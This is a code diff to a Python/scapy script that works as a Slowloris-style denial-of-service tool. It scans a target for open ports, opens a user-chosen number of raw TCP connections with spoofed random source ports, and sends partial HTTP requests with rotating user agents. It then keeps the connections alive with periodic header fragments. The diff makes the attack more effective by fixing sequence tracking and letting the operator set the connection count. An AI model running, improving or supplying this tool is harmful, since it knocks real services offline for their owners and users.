@@ -7,11 +7,20 @@ import asyncio
 import time
 from scapy.all import *
 
-src_ip = ''
-dst_ip = ''
-dst_port = 80
-sniffer = Sniffer_TCP.Sniffer(src_ip)
+try:
+	dst_ip = sys.argv[1]
+except:
+	dst_ip = input('Enter IP: ')
+
+#src_ip = ''
+#dst_ip = ''
 connections = []
+
+p = IP(dst=dst_ip)/TCP(dport=8888, flags='S')
+r = sr1(p, verbose=False)
+src_ip = str(r[0].dst)
+sniffer = Sniffer_TCP.Sniffer(src_ip)
+print('Your ip: {}'.format(src_ip))
 
 
 user_agents = [
@@ -50,6 +59,8 @@ def ports_scanner(dst_ip):
 	for i in res:
 		if i[1][1].flags == 18:
 			open_ports.append(i[1].sport)
+			packet = IP(dst=dst_ip)/TCP(dport=i[1][1].sport,flags='R')
+			send(packet, verbose=False)
 
 	if open_ports:
 		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
@@ -79,6 +90,19 @@ async def send_syn():
 	global dst_port
 	global quantity_of_connections
 	global free_ports
+	global sniffer
+
+	
+	open_ports = ports_scanner(dst_ip)
+	
+	while True:
+		dst_port = int(input('Which one (port)? '))
+		if dst_port not in open_ports:
+			print('{} is not open. Choose from: {}'.format(dst_port, open_ports))
+		else:
+			break
+
+	t = time.time()
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 	flags = 0b0000010 #SYN flag
@@ -87,19 +111,18 @@ async def send_syn():
 
 	packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, flags)
 	sniffer.ip = src_ip
-	i = 0
 
-	output_packets = 0
+	x = int(input('How many connections? '))
 	t = time.time()
-	for i in range(1000):
+	for i in range(x):
 		s.sendto(packet.build(), (dst_ip, dst_port))
 		packet.seq = random.randint(0, 4294967295)
 		src_port = random.choice(free_ports)
 		free_ports.remove(src_port)
 		packet.src_port = src_port
 		await asyncio.sleep(0.01)
-		output_packets += 1
-	print('1000 connections were made in {} seconds'.format(time.time() - t))
+	print('{} connections were made in {}'.format(x, time.time() - t))
+
 
 async def connect():
 
@@ -121,7 +144,7 @@ async def connect():
 
 			response_packet = sniffer.TCP_stack[0]
 
-			if (response_packet.flags['S'] and response_packet.flags['A']):
+			if (response_packet.flags['S'] and response_packet.flags['A']) and (response_packet.dst_port not in ports):
 				flags = 0b00010000 #ACK flag
 				packet = TCPackets.TCPPacket(src_ip, response_packet.dst_port, dst_ip, dst_port, flags)
 				packet.seq = response_packet.ack
@@ -135,21 +158,18 @@ async def connect():
 				data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5"))
 								
 				send(packet/data, verbose=False)
-				#con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack)
-				#connections.append(con)
+				con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack + len(data))
+				connections.append(con)
 				
 
-			elif response_packet.flags['A'] and not response_packet.flags['S'] and not response_packet.flags['F']:
-				con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack)
-				connections.append(con)
-
 			elif response_packet.flags['F']:
-				#print('- 1 Connection')
+
 				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='A', seq=response_packet.ack, ack=response_packet.seq+1)
 				send(packet, verbose=False)
 				
 				if response_packet.dst_port in ports:				
-					ports.remove(response_packet.dst_port)
+					connections.pop(ports.index(response_packet.dst_port))
+					ports.remove(response_packet.dst_port)				
 				
 				src_port = random.choice(free_ports)
 				free_ports.remove(src_port)
@@ -171,15 +191,19 @@ async def keep_connection_open():
 	while True:
 		if len(connections) != 0:
 			print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))
+
+		t = time.time()
 		
 		for conn in connections:
 			packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
 			data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
 			send(packet/data, verbose=False)
+			conn.seq += len(data)
 			await asyncio.sleep(0)
-		
-		connections = list()
-		
+
+		if len(connections) != 0:
+			print('In time: {}'.format(time.time() - t))
+
 		await asyncio.sleep(10)
 		
 		
